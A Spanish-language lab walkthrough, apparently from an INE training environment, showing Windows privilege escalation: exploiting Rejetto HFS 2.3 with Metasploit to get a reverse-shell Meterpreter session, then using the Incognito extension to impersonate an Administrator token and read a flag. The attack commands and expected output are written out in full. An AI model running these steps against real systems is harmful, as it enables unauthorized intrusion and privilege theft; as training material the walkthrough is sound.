# 🎭 Escalada de Privilegios: Suplantación de Tokens (Incognito)

## 🎯 Objetivo

Después de obtener una sesión Meterpreter con privilegios limitados (por ejemplo, como servicio local), utilizar la extensión **Incognito** para listar y suplantar un token de acceso del usuario **Administrador**. Con el nuevo contexto de seguridad, leer la bandera que se encuentra en un directorio protegido.

---

## 🔍 1. Enumeración y acceso inicial

### 📡 Verificar conectividad

```bash
ping -c 4 demo.ine.local
```

### 🔎 Escaneo de puertos y detección de servicios

```bash
nmap demo.ine.local
```

**Salida esperada (fragmento):**
```
PORT     STATE SERVICE
80/tcp   open  http
...
```

### 🧪 Detección de versión en el puerto 80

```bash
nmap -sV -p 80 demo.ine.local
```

**Resultado:**  
Se identifica **Rejetto HTTP File Server 2.3** (u otra aplicación vulnerable). En este laboratorio se explota HFS 2.3 para obtener una sesión inicial.

---

## 🚀 2. Explotación y obtención de sesión Meterpreter

Se utiliza el módulo de Metasploit `rejetto_hfs_exec` para obtener un shell.

```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
```

**Progreso esperado:**
```
[*] Started reverse TCP handler on 10.0.0.2:4444
[*] Sending stage (175174 bytes) to 10.0.0.3
[*] Meterpreter session 1 opened (10.0.0.2:4444 -> 10.0.0.3:49162)
```

### 👤 Verificar el usuario actual

```bash
meterpreter > getuid
```

**Salida:**  
`Server username: NT AUTHORITY\LOCAL SERVICE`

El contexto actual no permite leer archivos en el escritorio del Administrador.

---

## 📁 3. Intento fallido de lectura de la bandera

Se sabe que la bandera se encuentra en `C:\Users\Administrator\Desktop\flag.txt`.

```bash
meterpreter > cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

**Respuesta esperada:**  
`[-] stdapi_fs_stat: Operation failed: Access is denied.`

Los permisos actuales impiden el acceso.

---

## 🪪 4. Uso de la extensión Incognito

La extensión **Incognito** permite listar y suplantar tokens de acceso disponibles en el sistema. Si hay una sesión activa del usuario **Administrador**, su token puede ser robado para elevar privilegios.

### ⚙️ Cargar Incognito

```bash
meterpreter > load incognito
```

**Salida esperada:**
```
Loading extension incognito... Success.
```

### 📋 Listar tokens de usuario disponibles

```bash
meterpreter > list_tokens -u
```

| Comando | Descripción |
|---------|-------------|
| `list_tokens -u` | Muestra los tokens de usuario (no los de grupo) |

**Salida típica:**
```
Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
...
```

Se observa que el token **`ATTACKDEFENSE\Administrator`** está disponible para suplantación.

---

## 🎭 5. Suplantación del token del Administrador

```bash
meterpreter > impersonate_token ATTACKDEFENSE\\Administrator
```

| Comando | Descripción |
|---------|-------------|
| `impersonate_token` | Asume la identidad del token especificado |

**Salida esperada:**
```
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
```

### 👤 Verificar el nuevo contexto

```bash
meterpreter > getuid
```

**Resultado:**  
`Server username: ATTACKDEFENSE\Administrator`

Ahora la sesión tiene los mismos privilegios que el Administrador.

---

## 🏁 6. Lectura de la bandera

Con los nuevos privilegios se puede acceder al escritorio y leer el archivo.

```bash
meterpreter > cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

**Bandera obtenida:**  
`x28c832a39730b7d46d6c38f1ea18e12`

---

## 🧠 Resumen del ataque

| Paso | Herramienta / Comando | Propósito |
|------|------------------------|-----------|
| 1 | `nmap -sV -p 80` | Identificar servicio vulnerable |
| 2 | `exploit/windows/http/rejetto_hfs_exec` | Obtener sesión Meterpreter (LOCAL SERVICE) |
| 3 | `load incognito` | Cargar la extensión de suplantación de tokens |
| 4 | `list_tokens -u` | Enumerar tokens disponibles |
| 5 | `impersonate_token ATTACKDEFENSE\\Administrator` | Asumir la identidad del administrador |
| 6 | `cat C:\Users\Administrator\Desktop\flag.txt` | Leer la bandera protegida |

La extensión **Incognito** aprovecha los tokens de acceso de Windows que permanecen en memoria cuando un usuario ha iniciado sesión. Si un proceso del sistema tiene un token de delegación de un usuario privilegiado, un atacante con permisos suficientes puede suplantarlo y escalar sus privilegios de forma sigilosa.
